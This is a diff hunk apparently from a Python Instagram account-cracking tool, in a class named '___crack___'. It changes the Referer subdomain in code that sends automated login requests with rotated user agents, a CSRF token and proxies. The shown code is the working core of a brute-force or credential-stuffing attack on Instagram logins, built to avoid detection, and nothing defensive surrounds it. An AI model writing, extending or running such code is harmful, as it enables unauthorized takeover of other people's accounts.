@@ -432,7 +432,7 @@ class ___crack___:
                 'optIntoOneTap': 'false'}
                 ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
-                'Referer': 'https://z-p15.www.instagram.com/accounts/login/',
+                'Referer': 'https://z-p42.www.instagram.com/accounts/login/',
                 'x-csrftoken': ___csrf}
                 with requests.Session() as ses:
                     response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
